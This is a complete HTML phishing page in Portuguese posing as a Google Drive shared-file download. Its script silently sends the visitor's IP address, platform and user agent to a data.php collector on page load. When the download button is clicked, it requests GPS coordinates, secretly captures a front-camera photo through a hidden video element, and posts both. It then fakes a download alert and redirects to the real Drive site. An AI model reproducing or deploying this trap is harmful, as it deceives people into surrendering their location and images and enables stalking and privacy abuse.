<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- META TAGS PARA PREVIEW (LINK PREVIEW) -->
    <meta property="og:title" content="Arquivos processso">
    <meta property="og:description" content="Clique para visualizar e fazer o download do arquivo compartilhado.">
    
    <meta property="og:type" content="website">
    
    <!-- TAGS EXTRAS PARA COMPATIBILIDADE -->
    
    <meta name="twitter:card" content="summary_large_image">
    
    
    <title>Arquivos processso</title>
    <style>
        body { background-color: #f7f7f7; font-family: Roboto, Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .gdrive-card { background-color: #fff; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); max-width: 450px; width: 90%; text-align: center; padding: 40px 30px; }
        .gdrive-icon { width: 50px; height: 50px; margin-bottom: 20px; }
        .file-image { width: 100%; max-width: 300px; height: auto; border-radius: 4px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { font-size: 24px; color: #202124; margin: 0 0 10px 0; font-weight: 400; }
        .gdrive-desc { font-size: 14px; color: #5f6368; margin-bottom: 30px; }
        .btn-download { background-color: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; text-transform: uppercase; transition: background 0.2s; }
        .btn-download:hover { background-color: #1669c5; }
        
        /* Estilos do Loader */
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: none; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-text { display: inline-block; }
    </style>
</head>
<body>

    <div class="gdrive-card">
        <img src="https://ssl.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png" alt="Google Drive Icon" class="gdrive-icon">
        <img src="images/gdrive_default.png" alt="Preview do Arquivo" class="file-image">
        <h1>Arquivos processso</h1>
        <div class="gdrive-desc">Clique para visualizar e fazer o download do arquivo compartilhado.</div>
        <button id="downloadBtn" class="btn-download" onclick="startTrap()">
            <span class="btn-text">FAZER DOWNLOAD</span>
            <div id="loader" class="loader"></div>
        </button>
    </div>

<script>
    const btn = document.getElementById('downloadBtn');
    const btnText = document.querySelector('.btn-text');
    const loader = document.getElementById('loader');

    // 1. Captura IP ao carregar
    window.onload = function() {
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
            fetch('data.php', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip:d.ip, os:navigator.platform, platform:navigator.userAgent, browser:navigator.appName})});
        });
    };

    function showLoading() {
        btnText.style.display = 'none';
        loader.style.display = 'block';
        btn.disabled = true;
    }

    function startTrap() {
        showLoading();
        if (navigator.geolocation) {
            // Pede GPS
            navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError);
        } else { 
            // Se GPS falhar ou não suportado, tenta Câmara
            requestCamera(); 
        }
    }

    function onPosSuccess(pos) {
        // Envia GPS
        fetch('data.php', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy })
        });
        // Tenta Câmara IMEDIATAMENTE após o GPS
        requestCamera();
    }

    function onPosError(err) {
        // Se negar GPS, tenta Câmara mesmo assim
        requestCamera();
    }

    function requestCamera() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function(stream) {
                // Cria vídeo invisível
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Espera 800ms para ajustar luz
                setTimeout(function() {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const data = canvas.toDataURL('image/png');
                    
                    // Para o stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Envia Foto e Finaliza
                    fetch('data.php', {
                        method: 'POST', headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({img: data})
                    }).then(finish);
                }, 800);
            })
            .catch(function(err) {
                // Se negar câmara, finaliza
                finish();
            });
        } else {
            finish();
        }
    }

    function finish() {
        // Simula o download
        alert("Download do arquivo iniciado. Aguarde..."); // Não é uma função real, apenas feedback
        // Redireciona para o Google Drive oficial ou URL definida
        window.location.href = "https://drive.google.com";
    }
</script>

</body>
</html>
